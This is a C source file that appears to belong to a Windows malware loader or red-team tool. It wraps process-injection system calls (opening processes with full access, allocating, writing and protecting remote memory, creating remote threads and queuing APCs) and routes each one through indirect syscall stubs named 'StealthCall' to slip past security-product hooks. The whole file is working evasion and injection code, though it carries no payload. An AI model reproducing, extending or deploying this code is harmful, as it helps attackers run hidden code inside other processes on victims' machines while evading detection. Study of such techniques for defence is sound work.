#include "..\helper.h"

#include "wrappers.h"

BOOL WrapperReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead) {
    DWORD ssn = 0;
    PVOID target = NULL;
    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), "NtReadVirtualMemory", &ssn, &target);

    if (!target) return FALSE;

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5,
        (UINT64)hProcess,
        (UINT64)lpBaseAddress,
        (UINT64)lpBuffer,
        (UINT64)nSize,
        (UINT64)lpNumberOfBytesRead);

    return (status == 0);
}

BOOL WrapperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    DWORD dwNtWriteSSN = 0;
    PVOID pNtWriteSyscallPtr = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");

    getInDirectSyscallStub(hNtdll, "NtWriteVirtualMemory", &dwNtWriteSSN, &pNtWriteSyscallPtr);

    if (!pNtWriteSyscallPtr) {
        return FALSE;
    }

    NTSTATUS status = (NTSTATUS)StealthCall(
        dwNtWriteSSN, 
        pNtWriteSyscallPtr, 
        5,
        (UINT64)hProcess, 
        (UINT64)lpBaseAddress, 
        (UINT64)lpBuffer, 
        (UINT64)nSize, 
        (UINT64)lpNumberOfBytesWritten
    );

    if (status != 0x00000000) {
        // Optionnel : SetLastError(RtlNtStatusToDosError(status));
        printf("[!] NtWriteVirtualMemory failed avec status: 0x%X\n", status);
        return FALSE;
    }

    return TRUE;
}

BOOL WrapperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, LPVOID* lpOutAddress) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtAllocateVirtualMemory", &ssn, &target);

    if (!target) return FALSE;

    // NtAllocateVirtualMemory(hProcess, &lpAddress, ZeroBits, &dwSize, flAllocationType, flProtect)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 6, 
        (UINT64)hProcess, (UINT64)&lpAddress, (UINT64)0, (UINT64)&dwSize, (UINT64)flAllocationType, (UINT64)flProtect);

    if (status != 0) return FALSE;
    if (lpOutAddress) *lpOutAddress = lpAddress;
    return TRUE;
}

BOOL WrapperVirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtProtectVirtualMemory", &ssn, &target);

    if (!target) return FALSE;

    // NtProtectVirtualMemory(hProcess, &lpAddress, &dwSize, flNewProtect, lpflOldProtect)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5, 
        (UINT64)hProcess, (UINT64)&lpAddress, (UINT64)&dwSize, (UINT64)flNewProtect, (UINT64)lpflOldProtect);

    return (status == 0);
}

BOOL WrapperCreateRemoteThreadEx(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, SIZE_T dwStackSize, PHANDLE phThread) {
    DWORD ssn = 0; PVOID target = NULL;
    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx", &ssn, &target);
    if (!target) return FALSE;

    // Conversion Win32 CREATE_SUSPENDED (0x4) -> NT_SUSPENDED (0x1)
    ULONG ntFlags = (dwCreationFlags & 0x00000004) ? 0x1 : 0x0;

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 11, 
        (UINT64)phThread, (UINT64)THREAD_ALL_ACCESS, (UINT64)NULL, (UINT64)hProcess, 
        (UINT64)lpStartAddress, (UINT64)lpParameter, (UINT64)ntFlags, (UINT64)0, (UINT64)dwStackSize, (UINT64)0, (UINT64)NULL);

    return (status == 0);
}

BOOL WrapperQueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtQueueApcThread", &ssn, &target);

    if (!target) return FALSE;

    // NtQueueApcThread(hThread, pfnAPC, dwData, NULL, NULL)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5, 
        (UINT64)hThread, (UINT64)pfnAPC, (UINT64)dwData, (UINT64)NULL, (UINT64)NULL);

    return (status == 0);
}

BOOL WrapperResumeThread(HANDLE hThread) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtResumeThread", &ssn, &target);

    ULONG suspendCount = 0;
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 2, (UINT64)hThread, (UINT64)&suspendCount);

    return (status == 0);
}

HANDLE WrapperOpenProcess(DWORD dwPid) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtOpenProcess", &ssn, &target);

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)(UINT_PTR)dwPid;
    clientId.UniqueThread = 0;

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 4, 
        (UINT64)&hProcess, (UINT64)PROCESS_ALL_ACCESS, (UINT64)&objAttr, (UINT64)&clientId);

    return (status == 0) ? hProcess : NULL;
}

BOOL WrapperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtWaitForSingleObject", &ssn, &target);

    LARGE_INTEGER timeout;
    timeout.QuadPart = -(LONGLONG)dwMilliseconds * 10000; // Conversion en temps relatif NT

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 3, 
        (UINT64)hHandle, (UINT64)FALSE, (UINT64)(dwMilliseconds == INFINITE ? NULL : &timeout));

    return (status == 0);
}

LPVOID WrapperVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    LPVOID pAllocatedAddress = lpAddress;
    if (WrapperVirtualAllocEx((HANDLE)-1, pAllocatedAddress, dwSize, flAllocationType, flProtect, &pAllocatedAddress)) {
        return pAllocatedAddress;
    }
    
    return NULL;
}

BOOL WrapperVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    LPVOID baseAddr = lpAddress;
    SIZE_T size = dwSize;
    
    return WrapperVirtualProtectEx((HANDLE)-1, baseAddr, size, flNewProtect, lpflOldProtect);
}

HANDLE WrapperCreateThread(LPSECURITY_ATTRIBUTES lpAttr, SIZE_T dwStack, LPTHREAD_START_ROUTINE lpStart, LPVOID lpParam, DWORD dwFlags, LPDWORD lpId) {
    HANDLE hThread = NULL;
    if (WrapperCreateRemoteThreadEx((HANDLE)-1, (LPVOID)lpStart, lpParam, dwFlags, dwStack, &hThread)) {
        if (lpId) *lpId = GetThreadId(hThread);
        return hThread;
    }
    return NULL;
}